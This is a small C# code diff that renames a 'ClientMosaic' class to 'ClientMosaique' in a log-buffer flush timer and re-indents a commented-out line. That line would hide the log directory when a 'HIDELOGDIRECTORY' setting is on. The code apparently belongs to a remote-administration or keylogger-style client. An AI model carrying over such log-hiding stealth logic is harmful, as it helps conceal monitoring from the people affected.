@@ -236,7 +236,7 @@ namespace Client.Controllers.Tools
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0 && !ClientMosaic.EXITING)
+            if (_logFileBuffer.Length > 0 && !ClientMosaique.EXITING)
                 WriteFile();
         }
 
@@ -254,7 +254,7 @@ namespace Client.Controllers.Tools
                     di.Create();
 
                 //if (Settings.HIDELOGDIRECTORY)
-                   // di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                // di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
 
                 if (!File.Exists(filename))
                     writeHeader = true;
